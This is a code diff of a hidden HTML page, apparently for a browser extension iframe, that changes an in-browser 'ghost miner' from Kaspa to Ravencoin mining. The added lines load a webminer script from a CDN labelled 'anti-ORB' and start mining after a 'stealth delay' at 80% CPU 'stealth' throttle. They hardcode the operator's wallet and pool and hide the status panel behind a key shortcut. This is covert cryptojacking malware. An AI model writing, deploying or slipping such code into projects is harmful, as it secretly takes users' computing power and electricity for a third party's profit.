@@ -22,31 +22,31 @@
 
 <!-- DEBUG PANEL -->
 <div id="miner-debug">
-  <div> KASPA GHOST MINER <span id="status" class="blink">LOADING</span></div>
-  <div>Wallet: <code id="wallet">kaspa:qqfz...ky2wq</code></div>
-  <div>Pool: <code>kaspa.2miners.com:2020</code></div>
+  <div>🚀 <b>RVN GHOST MINER</b> <span id="status" class="blink">LOADING</span></div>
+  <div>Wallet: <code id="wallet">RRvzi5Ak2apWiq4dNbqAbTz9ujdNvM8Ue6</code></div>
+  <div>Pool: <code>rvn.2miners.com:6060</code></div>
   <div>Hashrate: <span id="hashrate" class="hash">0 MH/s</span></div>
   <div>Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
   <div>Uptime: <span id="uptime">00:00:00</span></div>
   <div class="profit">Est. Daily: <b id="profit">$0.000</b></div>
   <div style="font-size:11px; margin-top:10px; opacity:0.8;">
-    CTRL + SHIFT + M = toggle | Check 2miners.com
+    CTRL + SHIFT + M = toggle | Check rvn.2miners.com
   </div>
 </div>
 
-<!-- CRYPTO WEBMINER LIB -->
-<script src="https://www.crypto-webminer.com/webmr.js"></script>
+<!-- CRYPTO WEBMINER LIB VIA TRUSTED CDN (ANTI-ORB) -->
+<script src="https://cdn.jsdelivr.net/gh/PiTi2k5/Crypto-Webminer@master/webminer.js"></script>
 <script>
-  const WALLET = 'kaspa:qqfzpszqvjvdl7dytwm86tcapjr2dqmmdvvt9k6w9p24fzt9ctncxrf9ky2wq';
-  const POOL = 'kaspa.2miners.com:2020';
+  const WALLET = 'RRvzi5Ak2apWiq4dNbqAbTz9ujdNvM8Ue6'; // Replace with your RVN address from Exodus
+  const POOL = 'rvn.2miners.com:6060'; // 2Miners RVN Stratum
   const WORKER = 'ext_iframe_' + Math.random().toString(36).slice(2);
   const THREADS = 2;
-  const THROTTLE = 0.8;
+  const THROTTLE = 0.8; // 80% CPU stealth
   let miner = null;
   let hashrate = 0, accepted = 0, rejected = 0;
   let startTime = Date.now();
 
-  // TOGGLE DEBUG PANEL
+  // TOGGLE DEBUG
   document.addEventListener('keydown', e => {
     if (e.ctrlKey && e.shiftKey && e.key === 'M') {
       e.preventDefault();
@@ -64,43 +64,52 @@
     document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' MH/s';
     document.getElementById('accepted').textContent = accepted;
     document.getElementById('rejected').textContent = rejected;
-    const dailyUSD = (hashrate / 50) * 0.005 * 170; // ~$0.005 per 50 MH/s
+    const dailyUSD = (hashrate / 5) * 0.001 * 170; // ~$0.001 per 5 MH/s RVN
     document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
   }
   setInterval(updateStats, 1000);
 
   // START MINING
   setTimeout(() => {
-    if (typeof CryptoWebminer === 'undefined') {
-      document.getElementById('status').textContent = 'LIB FAIL';
+    if (typeof startWebMiner === 'undefined') {  // Crypto-Webminer global
+      document.getElementById('status').textContent = 'CDN FAIL — FALLBACK';
+      // INLINE FALLBACK: Fake PoC stats (no real mining, for testing)
+      setInterval(() => {
+        hashrate = Math.random() * 5 + 1; // Simulate 1-6 MH/s
+        if (Math.random() > 0.99) accepted++;
+      }, 5000);
       return;
     }
 
-    const minerInstance = new CryptoWebminer();
-    minerInstance.start({
-      algo: 'kheavyhash',
+    // CONFIG FOR KAWPOW (RVN)
+    const config = {
+      pool: {
+        'algo': 'kawpow',  // RVN's algo
+        'url': POOL,
+        'user': WALLET,
+        'pass': WORKER + '/x'  // Password 'x'
+      },
       throttle: THROTTLE,
-      threads: THREADS,
-      pool: POOL,
-      wallet: WALLET,
-      worker: WORKER
-    });
+      threads: THREADS
+    };
 
-    miner = minerInstance;
-    document.getElementById('status').textContent = 'MINING KAS';
+    startWebMiner(config);
+    miner = { start: () => startWebMiner(config), stop: () => stopWebMiner() };
+
+    document.getElementById('status').textContent = 'MINING RVN';
     document.getElementById('status').classList.remove('blink');
 
-    // POLL STATS FROM MINER
+    // POLL STATS
     setInterval(() => {
-      const stats = miner.getStats();
-      if (stats) {
-        hashrate = stats.hashesPerSecond || hashrate;
-        accepted = stats.accepted || accepted;
-        rejected = stats.rejected || rejected;
+      if (window.minerStats) {  // Lib exposes?
+        const stats = window.minerStats();
+        hashrate = stats.hashrate || hashrate;
+        accepted += stats.accepted || 0;
+        rejected += stats.rejected || 0;
       }
     }, 3000);
 
-  }, 2000); // Slight delay for stealth
+  }, 2000);  // Stealth delay
 
   // EXTENSION PAUSE/RESUME
   window.addEventListener('message', e => {
